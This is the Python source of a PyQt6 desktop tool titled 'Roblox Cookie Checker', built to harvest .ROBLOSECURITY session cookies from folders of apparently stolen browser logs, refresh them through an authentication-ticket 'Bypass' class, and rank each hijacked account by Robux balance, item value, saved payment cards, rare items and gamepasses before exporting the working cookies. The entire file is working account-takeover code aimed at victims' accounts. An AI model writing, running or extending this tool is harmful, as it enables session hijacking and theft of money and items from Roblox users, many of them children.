import os
import re
import threading
import datetime
from datetime import timezone
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from PyQt6.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, 
                           QHBoxLayout, QPushButton, QLabel, QTextEdit, 
                           QFileDialog, QMessageBox, QProgressBar, QLineEdit)
from PyQt6.QtCore import Qt, QThread, pyqtSignal
from PyQt6.QtGui import QFont, QIcon, QPalette, QColor
import sys
import ctypes
import json

GAMEPASS_IDS = {
    "jailbreak": [2070427,2218187, 2219040, 2296901, 2725211, 4974038, 56149618],
    "murder_mystery": [429957, 1308795, 1008841389, 1008813284, 1009231264],
    "adopt_me": [3196348, 5300198, 6040696, 6408694, 6965379, 7124470, 
                 951065968, 951395729, 951441773, 189425850, 452166553, 
                 805940409, 2653673789, 452165964, 452165174, 576894828, 
                 1263500178, 452166306, 452165711, 452163458],
    "blade_ball": [223367086, 226785981, 229765926, 895596060],
    "pet_simulator_99": [205379487, 257803774, 257811346, 258567677, 264808140, 
                         259437976, 720275150, 690997523, 655859720, 651611000, 
                         265320491, 265324265, 975558264]
}

HEADLESS_ID = 134082579
KORBLOX_ID = 139607718

UI_STYLES = {
    "dark": """
        QMainWindow {
            background-color: #1e1e1e;
        }
        QWidget {
            color: #ffffff;
            font-family: 'Segoe UI', Arial;
        }
        QPushButton {
            background-color: #2d2d2d;
            border: 1px solid #3d3d3d;
            border-radius: 4px;
            padding: 8px 16px;
            color: #ffffff;
            font-weight: bold;
        }
        QPushButton:hover {
            background-color: #3d3d3d;
            border-color: #4d4d4d;
        }
        QPushButton:disabled {
            background-color: #252525;
            color: #666666;
            border-color: #333333;
        }
        QTextEdit {
            background-color: #2d2d2d;
            border: 1px solid #3d3d3d;
            border-radius: 4px;
            padding: 8px;
            color: #ffffff;
            font-family: 'Consolas', monospace;
        }
        QProgressBar {
            border: 1px solid #3d3d3d;
            border-radius: 4px;
            text-align: center;
            background-color: #2d2d2d;
        }
        QProgressBar::chunk {
            background-color: #007acc;
            border-radius: 3px;
        }
        QLineEdit {
            background-color: #2d2d2d;
            border: 1px solid #3d3d3d;
            border-radius: 4px;
            padding: 8px;
            color: #ffffff;
        }
    """,
    "light": """
        QMainWindow {
            background-color: #f5f5f5;
        }
        QWidget {
            color: #333333;
            font-family: 'Segoe UI', Arial;
        }
        QPushButton {
            background-color: #e1e1e1;
            border: 1px solid #d1d1d1;
            border-radius: 4px;
            padding: 8px 16px;
            color: #333333;
            font-weight: bold;
        }
        QPushButton:hover {
            background-color: #d1d1d1;
            border-color: #c1c1c1;
        }
        QPushButton:disabled {
            background-color: #f0f0f0;
            color: #999999;
            border-color: #e0e0e0;
        }
        QTextEdit {
            background-color: #ffffff;
            border: 1px solid #d1d1d1;
            border-radius: 4px;
            padding: 8px;
            color: #333333;
            font-family: 'Consolas', monospace;
        }
        QProgressBar {
            border: 1px solid #d1d1d1;
            border-radius: 4px;
            text-align: center;
            background-color: #ffffff;
        }
        QProgressBar::chunk {
            background-color: #007acc;
            border-radius: 3px;
        }
        QLineEdit {
            background-color: #ffffff;
            border: 1px solid #d1d1d1;
            border-radius: 4px;
            padding: 8px;
            color: #333333;
        }
    """
}

class Bypass:
    def __init__(self, cookie) -> None:
        self.cookie = cookie
    
    def start_process(self):
        self.xcsrf_token = self.get_csrf_token()
        self.rbx_authentication_ticket = self.get_rbx_authentication_ticket()
        return self.get_set_cookie()
        
    def get_set_cookie(self):
        response = requests.post(
            "https://auth.roblox.com/v1/authentication-ticket/redeem",
            headers={"rbxauthenticationnegotiation": "1"},
            json={"authenticationTicket": self.rbx_authentication_ticket}
        )
        set_cookie_header = response.headers.get("set-cookie")
        if not set_cookie_header:
            return "Invalid Cookie"
        
        valid_cookie = set_cookie_header.split(".ROBLOSECURITY=")[1].split(";")[0]
        return f"_{valid_cookie}"
        
    def get_rbx_authentication_ticket(self) -> str:
        response = requests.post(
            "https://auth.roblox.com/v1/authentication-ticket",
            headers={
                "rbxauthenticationnegotiation": "1",
                "referer": "https://www.roblox.com/camel",
                "Content-Type": "application/json",
                "x-csrf-token": self.xcsrf_token
            },
            cookies={".ROBLOSECURITY": self.cookie}
        )
        assert response.headers.get("rbx-authentication-ticket"), "Error getting rbx-authentication-ticket"
        return response.headers.get("rbx-authentication-ticket")
        
    def get_csrf_token(self) -> str:
        response = requests.post("https://auth.roblox.com/v2/logout", cookies={".ROBLOSECURITY": self.cookie})
        xcsrf_token = response.headers.get("x-csrf-token")
        assert xcsrf_token, "Error getting X-CSRF-TOKEN. Possibly invalid Roblox Cookie"
        return xcsrf_token

def clear_console():
    if os.name == 'nt':
        _ = os.system('cls')
    else:
        _ = os.system('clear')

def check_payment_methods(session, cookie):
    try:
        response = session.get(
            "https://apis.roblox.com/payments-gateway/v1/payment-profiles", 
            headers={"Cookie": f".ROBLOSECURITY={cookie}"}, 
            timeout=2
        )
        return len(response.json()) if response.status_code == 200 and isinstance(response.json(), list) else 0
    except:
        return 0

def check_gamepasses(session, cookie, user_id):
    results = {
        "jailbreak": {"has": False, "items": []},
        "murder_mystery": {"has": False, "items": []},
        "adopt_me": {"has": False, "items": []},
        "blade_ball": {"has": False, "items": []},
        "pet_simulator_99": {"has": False, "items": []}
    }
    
    gamepass_names = {
        "jailbreak": {
            2218187: "Car Stereo",
            2219040: "Duffel Bag",
            2296901: "VIP",
            2725211: "Pro Garage",
            4974038: "Crime Boss",
            2070427: "SWAT Team",
            56149618: "VIP Trading"
        },
        "murder_mystery": {
            429957: "Elite",
            1308795: "Radio",
            1008841389: "GODLY: Borealis",
            1008813284: "GODLY: Australis",
            1009231264: "BUNDLE: Aurora"
        },
        "adopt_me": {
            3196348: "VIP",
            5300198: "Premium Plots",
            6040696: "Millionaire Pack",
            6408694: "Celebrity Mansion",
            6965379: "Modern Mansion",
            7124470: "Hotdog Stand",
            951065968: "School and Hospital Homes",
            951395729: "Soccer Stadium",
            951441773: "Fossil Isle Returns Bundle",
            189425850: "Cozy Home Lure",
        },
        "blade_ball": {
            223367086: "VIP",
            226785981: "Double Coins",
            229765926: "Instant Spin",
            895596060: "Trading Sign"
        },
        "pet_simulator_99": {
            205379487: "Lucky!",
            257803774: "Ultra Lucky!",
            257811346: "VIP!",
            258567677: "Magic Eggs!",
            264808140: "Huge Hunter!",
            259437976: "+15 Pets!",
            720275150: "Double Stars!",
            690997523: "Super Drops!",
            655859720: "+15 Eggs!",
            651611000: "Daycare Slots!",
            265320491: "Auto Farm!",
            265324265: "Auto Tap!",
            975558264: "Super Shiny Hunter!"
        }
    }
    
    for game, pass_ids in GAMEPASS_IDS.items():
        for pass_id in pass_ids:
            try:
                response = session.get(
                    f'https://inventory.roblox.com/v1/users/{user_id}/items/GamePass/{pass_id}',
                    cookies={'.ROBLOSECURITY': cookie},
                    timeout=1
                )
                if response.status_code == 200:
                    data = response.json()
                    if data.get("data") and len(data["data"]) > 0:
                        results[game]["has"] = True
                        if pass_id in gamepass_names[game]:
                            results[game]["items"].append(gamepass_names[game][pass_id])
            except:
                continue
    
    return results

def check_special_items(session, cookie, user_id):
    headless_name = "Headless Head"
    korblox_name = "Korblox Deathspeaker"
    has_headless = None
    has_korblox = None
    
    try:
        headless_response = session.get(
            f'https://inventory.roblox.com/v1/users/{user_id}/items/Asset/{HEADLESS_ID}',
            cookies={'.ROBLOSECURITY': cookie},
            timeout=1
        )
        if headless_response.status_code == 200:
            has_headless = headless_name if headless_response.json().get("data") else None
            
        korblox_response = session.get(
            f'https://inventory.roblox.com/v1/users/{user_id}/items/Asset/{KORBLOX_ID}',
            cookies={'.ROBLOSECURITY': cookie},
            timeout=1
        )
        if korblox_response.status_code == 200:
            has_korblox = korblox_name if korblox_response.json().get("data") else None
    except:
        pass
        
    return has_headless, has_korblox

def get_rap(session, cookie, user_id):
    try:
        response = session.get(
            f'https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles',
            cookies={'.ROBLOSECURITY': cookie},
            timeout=1
        )
        if response.status_code == 200:
            data = response.json()
            return sum(item.get("recentAveragePrice", 0) for item in data.get("data", []))
        return 0
    except:
        return 0

def get_pending_robux(session, cookie):
    try:
        response = session.get(
            'https://economy.roblox.com/v1/user/currency-exchange',
            cookies={'.ROBLOSECURITY': cookie},
            timeout=1
        )
        return response.json().get("pendingRobux", 0) if response.status_code == 200 else 0
    except:
        return 0

def get_total_robux_spent(session, cookie, user_id):
    try:
        response = session.get(
            f'https://economy.roblox.com/v2/users/{user_id}/transactions?transactionType=Purchase&limit=10',
            cookies={'.ROBLOSECURITY': cookie},
            timeout=1
        )
        if response.status_code == 200:
            data = response.json()
            return sum(abs(t["currency"]["amount"]) for t in data.get("data", []) 
                      if "currency" in t and t["currency"]["type"] == "Robux")
        return 0
    except:
        return 0

def is_premium(session, cookie, user_id):
    try:
        response = session.get(
            f'https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership',
            cookies={'.ROBLOSECURITY': cookie},
            timeout=1
        )
        return response.status_code == 200 and response.json()
    except:
        return False

def check_badges(session, cookie, user_id, badge_ids):
    if not badge_ids:
        return {}
    
    results = {}
    for badge_id in badge_ids:
        try:
            response = session.get(
                f'https://badges.roblox.com/v1/users/{user_id}/badges/awarded-dates?badgeIds={badge_id}',
                cookies={'.ROBLOSECURITY': cookie},
                timeout=1
            )
            if response.status_code == 200:
                data = response.json()
                badge_info = data.get("data", [])
                has_badge = len(badge_info) > 0
                
                if has_badge:
                    badge_details = session.get(
                        f'https://badges.roblox.com/v1/badges/{badge_id}',
                        cookies={'.ROBLOSECURITY': cookie},
                        timeout=1
                    )
                    
                    if badge_details.status_code == 200:
                        badge_data = badge_details.json()
                        results[badge_id] = {
                            "name": badge_data.get("name", f"Badge {badge_id}"),
                            "description": badge_data.get("description", ""),
                            "awarded_date": badge_info[0].get("awardedDate") if badge_info else None
                        }
                    else:
                        results[badge_id] = {
                            "name": f"Badge {badge_id}",
                            "description": "",
                            "awarded_date": badge_info[0].get("awardedDate") if badge_info else None
                        }
                else:
                    results[badge_id] = None
        except Exception as e:
            results[badge_id] = None
            
    return results

class CookieSearchThread(QThread):
    progress_signal = pyqtSignal(str)
    finished_signal = pyqtSignal(list)

    def __init__(self, start_folder):
        super().__init__()
        self.start_folder = start_folder
        self.total_found = 0

    def run(self):
        try:
            cookies_files = []
            for root, dirs, files in os.walk(self.start_folder):
                if "cookies" in root.lower():
                    for file in files:
                        if file.endswith((".txt", ".log", ".json")):
                            cookies_files.append(os.path.join(root, file))

            if not cookies_files:
                self.progress_signal.emit("❌ No cookie files found.")
                self.finished_signal.emit([])
                return

            found_cookies = []
            self.total_found = 0

            for file_path in cookies_files:
                try:
                    with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                        content = f.read()
                        for line in content.splitlines():
                            line = line.strip()
                            if not line:
                                continue

                            if line.startswith("_|WARNING:-DO-NOT-SHARE-THIS"):
                                if len(line) >= 300:
                                    found_cookies.append(line)
                                    self.total_found += 1
                                continue

                            if "\t" in line:
                                parts = line.split("\t")
                                if len(parts) >= 7 and "roblox.com" in parts[0].lower():
                                    if parts[5] == ".ROBLOSECURITY":
                                        cookie_value = parts[6]
                                        if len(cookie_value) >= 300:
                                            found_cookies.append(cookie_value)
                                            self.total_found += 1
                            else:
                                match = re.search(r'\.ROBLOSECURITY[=:]\s*([a-zA-Z0-9_-]{300,})', line)
                                if match:
                                    found_cookies.append(match.group(1))
                                    self.total_found += 1

                except Exception as e:
                    continue

            self.progress_signal.emit(f"🔎 Found cookies: {self.total_found}")
            self.finished_signal.emit(found_cookies)

        except Exception as e:
            self.progress_signal.emit(f"❌ Search error: {str(e)}")
            self.finished_signal.emit([])

class CookieCheckWorker(QThread):
    progress_signal = pyqtSignal(str)
    finished_signal = pyqtSignal(list)
    progress_update = pyqtSignal(int)
    stats_signal = pyqtSignal(dict)

    def __init__(self, cookies, max_workers=10):
        super().__init__()
        self.cookies = cookies
        self.max_workers = max_workers
        self.valid_cookies_data = []
        self.custom_badge_ids = []
        self.custom_gamepass_ids = []
        self.valid_count = 0
        self.invalid_count = 0

    def set_badge_ids(self, badge_ids):
        self.custom_badge_ids = badge_ids

    def set_gamepass_ids(self, gamepass_ids):
        self.custom_gamepass_ids = gamepass_ids

    def check_single_cookie(self, data):
        i, raw_cookie = data
        try:
            bypass = Bypass(raw_cookie)
            refreshed_cookie = bypass.start_process()
            if refreshed_cookie != "Invalid Cookie":
                raw_cookie = refreshed_cookie
            
            cookie = raw_cookie.strip()
            
            if cookie.startswith("_|WARNING:-DO-NOT-SHARE-THIS"):
                cookie = cookie.split("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_")[-1]
            elif cookie.startswith("_"):
                cookie = cookie[1:]

            if len(cookie) < 300:
                self.invalid_count += 1
                return None

            session = requests.Session()
            
            response = session.get(
                "https://users.roblox.com/v1/users/authenticated",
                cookies={".ROBLOSECURITY": cookie},
                timeout=10
            )
            
            if response.status_code != 200:
                self.invalid_count += 1
                return None

            profile = response.json()
            user_id = profile.get("id")
            
            if not user_id:
                self.invalid_count += 1
                return None

            balance_response = session.get(
                f"https://economy.roblox.com/v1/users/{user_id}/currency",
                cookies={".ROBLOSECURITY": cookie},
                timeout=10
            )
            balance = balance_response.json().get("robux", 0) if balance_response.status_code == 200 else 0

            rap = get_rap(session, cookie, user_id)
            total_robux_spent = get_total_robux_spent(session, cookie, user_id)
            pending_robux = get_pending_robux(session, cookie)
            has_premium = is_premium(session, cookie, user_id)
            has_card = check_payment_methods(session, cookie) > 0
            headless_name, korblox_name = check_special_items(session, cookie, user_id)
            gamepasses = check_gamepasses(session, cookie, user_id)
            
            custom_badges = check_badges(session, cookie, user_id, self.custom_badge_ids) if self.custom_badge_ids else {}

            result = {
                "cookie": cookie,
                "username": profile.get("name", "Unknown"),
                "balance": balance,
                "rap": rap,
                "total_robux_spent": total_robux_spent,
                "pending_robux": pending_robux,
                "premium": "true" if has_premium else "false",
                "card": "true" if has_card else "false",
                "headless": headless_name,
                "korblox": korblox_name,
                "jailbreak": gamepasses["jailbreak"],
                "murder_mystery": gamepasses["murder_mystery"],
                "adopt_me": gamepasses["adopt_me"],
                "blade_ball": gamepasses["blade_ball"],
                "pet_simulator_99": gamepasses["pet_simulator_99"],
                "custom_badges": custom_badges
            }

            self.valid_count += 1
            
            def format_gamepass_items(game_data):
                if not game_data["has"]:
                    return "No"
                return ", ".join(game_data["items"]) if game_data["items"] else "Yes"
            
            badge_text = ""
            if custom_badges:
                badges_found = 0
                for badge_id, badge_info in custom_badges.items():
                    if badge_info:
                        badge_text += f"\n  • {badge_info['name']}"
                        badges_found += 1
                
                if badges_found == 0:
                    badge_text = "No"
                
            else:
                badge_text = "Not checked"

            self.progress_signal.emit(
                f"\n✅ Valid account #{self.valid_count}\n"
                f"👤 Name: {result['username']}\n"
                f"💰 Robux: R$ {result['balance']}\n"
                f"💎 RAP: R$ {result['rap']}\n"
                f"💵 Spent: R$ {result['total_robux_spent']}\n"
                f"⏳ Pending: R$ {result['pending_robux']}\n"
                f"👑 Premium: {'Yes' if result['premium'] == 'true' else 'No'}\n"
                f"💳 Card: {'Yes' if result['card'] == 'true' else 'No'}\n"
                f"👻 Headless: {result['headless'] if result['headless'] else 'No'}\n"
                f"🦿 Korblox: {result['korblox'] if result['korblox'] else 'No'}\n"
                f"🚔 Jailbreak: {format_gamepass_items(result['jailbreak'])}\n"
                f"🔪 Murder Mystery: {format_gamepass_items(result['murder_mystery'])}\n"
                f"🐱 Adopt Me: {format_gamepass_items(result['adopt_me'])}\n"
                f"⚔️ Blade Ball: {format_gamepass_items(result['blade_ball'])}\n"
                f"🐾 Pet Simulator 99: {format_gamepass_items(result['pet_simulator_99'])}\n"
                f"🎖️ Custom Badges: {badge_text}\n"
                + "="*50 + "\n"
            )
            return result

        except Exception as e:
            self.invalid_count += 1
            return None

    def run(self):
        try:
            with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
                futures = []
                for i, cookie in enumerate(self.cookies, 1):
                    future = executor.submit(self.check_single_cookie, (i, cookie))
                    futures.append(future)

                completed = 0
                valid_results = []
                
                for future in as_completed(futures):
                    completed += 1
                    self.progress_update.emit(completed)
                    
                    result = future.result()
                    if result:
                        valid_results.append(result)

            self.progress_signal.emit(
                f"\n{'='*50}\n"
                f"📊 Check Statistics:\n"
                f"✅ Valid: {self.valid_count}\n"
                f"❌ Invalid: {self.invalid_count}\n"
                f"📝 Total checked: {self.valid_count + self.invalid_count}\n"
                f"{'='*50}\n"
            )

            self.finished_signal.emit(valid_results)

        except Exception as e:
            self.progress_signal.emit(f"❌ Check error: {str(e)}")
            self.finished_signal.emit([])

class CookieChecker(QMainWindow):
    def __init__(self, theme="dark"):
        super().__init__()
        self.raw_cookies = []
        self.refreshed_cookies = []
        self.valid_cookies_data = []
        self.custom_badge_ids = []
        self.custom_gamepass_ids = []
        self.theme = theme
        self.init_ui()

    def init_ui(self):
        self.setWindowTitle("Roblox Cookie Checker")
        self.setMinimumSize(900, 700)
        self.setStyleSheet(UI_STYLES[self.theme])

        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        main_layout = QVBoxLayout(central_widget)
        main_layout.setSpacing(15)
        main_layout.setContentsMargins(20, 20, 20, 20)

        title_label = QLabel("Roblox Cookie Checker - FullA.cc")
        title_label.setStyleSheet("""
            font-size: 24px;
            font-weight: bold;
            color: #ff6f01;
            margin-bottom: 10px;
        """)
        title_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        main_layout.addWidget(title_label)

        info_label = QLabel("Load a cookie file or start searching:")
        info_label.setStyleSheet("font-size: 16px; margin-bottom: 10px;")
        info_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        main_layout.addWidget(info_label)

        badge_layout = QHBoxLayout()
        badge_label = QLabel("Badge IDs (comma separated):")
        badge_label.setStyleSheet("font-size: 14px;")
        self.badge_input = QLineEdit()
        self.badge_input.setPlaceholderText("Example: 2124496669, 2124445852")
        badge_layout.addWidget(badge_label)
        badge_layout.addWidget(self.badge_input)
        main_layout.addLayout(badge_layout)

        gamepass_layout = QHBoxLayout()
        gamepass_label = QLabel("Gamepass IDs (comma separated):")
        gamepass_label.setStyleSheet("font-size: 14px;")
        self.gamepass_input = QLineEdit()
        self.gamepass_input.setPlaceholderText("Example: 1234567, 7654321")
        gamepass_layout.addWidget(gamepass_label)
        gamepass_layout.addWidget(self.gamepass_input)
        main_layout.addLayout(gamepass_layout)

        theme_layout = QHBoxLayout()
        self.theme_button = QPushButton("🌓 " + ("Light Theme" if self.theme == "dark" else "Dark Theme"))
        self.theme_button.clicked.connect(self.toggle_theme)
        theme_layout.addWidget(self.theme_button)
        main_layout.addLayout(theme_layout)

        buttons_layout = QHBoxLayout()
        buttons_layout.setSpacing(10)

        self.find_cookies_button = QPushButton("🔍 Find Cookies")
        self.find_cookies_button.clicked.connect(self.start_cookie_search)
        buttons_layout.addWidget(self.find_cookies_button)

        self.load_file_button = QPushButton("📁 Load File")
        self.load_file_button.clicked.connect(self.load_cookies_from_file)
        buttons_layout.addWidget(self.load_file_button)

        self.check_button = QPushButton("✓ Check Cookies")
        self.check_button.clicked.connect(self.refresh_and_check_cookies)
        self.check_button.setEnabled(False)
        buttons_layout.addWidget(self.check_button)

        main_layout.addLayout(buttons_layout)

        self.progress_bar = QProgressBar()
        self.progress_bar.setFixedHeight(10)
        self.progress_bar.setTextVisible(False)
        self.progress_bar.hide()
        main_layout.addWidget(self.progress_bar)

        self.result_box = QTextEdit()
        self.result_box.setReadOnly(True)
        main_layout.addWidget(self.result_box)

        self.status_label = QLabel("Ready")
        self.status_label.setStyleSheet("""
            color: #666666;
            font-size: 12px;
            padding: 5px;
        """)
        self.status_label.setAlignment(Qt.AlignmentFlag.AlignRight)
        main_layout.addWidget(self.status_label)

    def toggle_theme(self):
        self.theme = "light" if self.theme == "dark" else "dark"
        self.theme_button.setText("🌓 " + ("Light Theme" if self.theme == "dark" else "Dark Theme"))
        self.setStyleSheet(UI_STYLES[self.theme])

    def _log_status(self, message):
        timestamp = datetime.datetime.now().strftime("%H:%M:%S")
        log_message = f"{timestamp} - {message}\n"
        self.result_box.append(log_message)
        self.status_label.setText(message.split("\n")[0])
        
    def start_cookie_search(self):
        start_folder = QFileDialog.getExistingDirectory(self, "Select folder to search")
        if not start_folder:
            return

        self.result_box.clear()
        self._log_status(f"🔍 Searching for cookie files in {start_folder}...")
        self.raw_cookies = []
        self.check_button.setEnabled(False)
        
        self.progress_bar.setRange(0, 0)
        self.progress_bar.show()

        self.search_thread = CookieSearchThread(start_folder)
        self.search_thread.progress_signal.connect(self._log_status)
        self.search_thread.finished_signal.connect(self.on_search_finished)
        self.search_thread.start()

    def on_search_finished(self, cookies):
        self.progress_bar.hide()
        self.raw_cookies = cookies
        if cookies:
            self._log_status(f"🎯 Total .ROBLOSECURITY cookies found: {len(cookies)}")
            self.check_button.setEnabled(True)
        else:
            self._log_status("❌ No cookies found.")

    def load_cookies_from_file(self):
        file_path, _ = QFileDialog.getOpenFileName(
            self,
            "Select cookie file",
            "",
            "Text Files (*.txt);;All Files (*.*)"
        )
        if not file_path:
            return
        
        self._load_cookies_from_path(file_path)

    def _load_cookies_from_path(self, path):
        self.raw_cookies = []
        self.refreshed_cookies = []
        self.valid_cookies_data = []
        self.result_box.clear()

        try:
            found_cookies = []
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                content = f.read()
                for line in content.splitlines():
                    line = line.strip()
                    if not line:
                        continue
                        
                    if line.startswith("_|WARNING:-DO-NOT-SHARE-THIS"):
                        cookie = line
                        if len(cookie) >= 300:
                            found_cookies.append(cookie)
                            continue
                            
                    if "\t" in line:
                        parts = line.split("\t")
                        if len(parts) >= 7 and "roblox.com" in parts[0].lower():
                            if parts[5] == ".ROBLOSECURITY":
                                cookie_value = parts[6]
                                if len(cookie_value) >= 300:
                                    found_cookies.append(cookie_value)
                    else:
                        match = re.search(r'\.ROBLOSECURITY[=:]\s*([a-zA-Z0-9_-]{300,})', line)
                        if match:
                            found_cookies.append(match.group(1))

            self.raw_cookies = found_cookies
            self._log_status(f"🎯 Total .ROBLOSECURITY cookies found: {len(found_cookies)}")
            self.check_button.setEnabled(bool(self.raw_cookies))

        except Exception as e:
            self._log_status(f"Error reading file: {str(e)}")
            self.check_button.setEnabled(False)

    def refresh_and_check_cookies(self):
        if not self.raw_cookies:
            self._log_status("❌ No cookies found.")
            return

        clear_console()

        badge_input = self.badge_input.text().strip()
        custom_badge_ids = []
        if badge_input:
            try:
                custom_badge_ids = [int(bid.strip()) for bid in badge_input.split(',') if bid.strip()]
            except ValueError:
                self._log_status("⚠️ Invalid badge ID format. Use numbers separated by commas.")
                return

        gamepass_input = self.gamepass_input.text().strip()
        custom_gamepass_ids = []
        if gamepass_input:
            try:
                custom_gamepass_ids = [int(gid.strip()) for gid in gamepass_input.split(',') if gid.strip()]
            except ValueError:
                self._log_status("⚠️ Invalid gamepass ID format. Use numbers separated by commas.")
                return

        self._log_status("\nStarting cookie validation...\n")
        self.refreshed_cookies = []
        self.valid_cookies_data = []
        
        total_cookies = len(self.raw_cookies)
        self.progress_bar.setRange(0, total_cookies)
        self.progress_bar.setValue(0)
        self.progress_bar.show()

        self.check_worker = CookieCheckWorker(self.raw_cookies)
        self.check_worker.set_badge_ids(custom_badge_ids)
        self.check_worker.set_gamepass_ids(custom_gamepass_ids)
        self.check_worker.progress_signal.connect(self._log_status)
        self.check_worker.progress_update.connect(self.progress_bar.setValue)
        self.check_worker.finished_signal.connect(self.on_check_finished)
        self.check_worker.start()

        self.find_cookies_button.setEnabled(False)
        self.load_file_button.setEnabled(False)
        self.check_button.setEnabled(False)

    def on_check_finished(self, valid_cookies):
        self.find_cookies_button.setEnabled(True)
        self.load_file_button.setEnabled(True)
        self.check_button.setEnabled(True)
        
        self.progress_bar.hide()
        self.valid_cookies_data = valid_cookies
        self._log_status(f"🎯 Total valid cookies found: {len(valid_cookies)}")
        self._export_valid_cookies()

    def _export_valid_cookies(self):
        if not self.valid_cookies_data:
            self._log_status("❌ No valid cookies found.")
            return

        filename = f"valid_cookies_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        try:
            with open(filename, "w", encoding='utf-8') as f:
                f.write("=== Valid Roblox Cookies ===\n")
                f.write(f"Check date: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
                for data in self.valid_cookies_data:
                    f.write(f"👤 Name: {data['username']}\n")
                    f.write(f"💰 Robux: R$ {data['balance']}\n")
                    f.write(f"💎 RAP: R$ {data['rap']}\n")
                    f.write(f"💵 Spent: R$ {data['total_robux_spent']}\n")
                    f.write(f"⏳ Pending: R$ {data['pending_robux']}\n")
                    f.write(f"👑 Premium: {'Yes' if data['premium'] == 'true' else 'No'}\n")
                    f.write(f"💳 Card: {'Yes' if data['card'] == 'true' else 'No'}\n")
                    f.write(f"👻 Headless: {data['headless'] if data['headless'] else 'No'}\n")
                    f.write(f"🦿 Korblox: {data['korblox'] if data['korblox'] else 'No'}\n")
                    
                    def format_gamepass_items(game_data):
                        if not game_data["has"]:
                            return "No"
                        return ", ".join(game_data["items"]) if game_data["items"] else "Yes"
                    
                    f.write(f"🚔 Jailbreak: {format_gamepass_items(data['jailbreak'])}\n")
                    f.write(f"🔪 Murder Mystery: {format_gamepass_items(data['murder_mystery'])}\n")
                    f.write(f"🐱 Adopt Me: {format_gamepass_items(data['adopt_me'])}\n")
                    f.write(f"⚔️ Blade Ball: {format_gamepass_items(data['blade_ball'])}\n")
                    f.write(f"🐾 Pet Simulator 99: {format_gamepass_items(data['pet_simulator_99'])}\n")
                    
                    if 'custom_badges' in data and data['custom_badges']:
                        f.write("🎖️ Custom Badges:\n")
                        for badge_id, badge_info in data['custom_badges'].items():
                            if badge_info:
                                f.write(f"  • {badge_info['name']} (ID: {badge_id})\n")
                            else:
                                f.write(f"  • Badge ID {badge_id}: Not found\n")
                    
                    f.write(f"🔑 Cookie: {data['cookie']}\n")
                    f.write("="*80 + "\n")
            
            self._log_status(f"✅ Successfully exported valid cookies to {filename}")
        except Exception as e:
            self._log_status(f"❌ Failed to save file: {str(e)}")
            QMessageBox.critical(self, "Error", f"Failed to save file:\n{str(e)}")

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = CookieChecker()
    window.show()
    sys.exit(app.exec())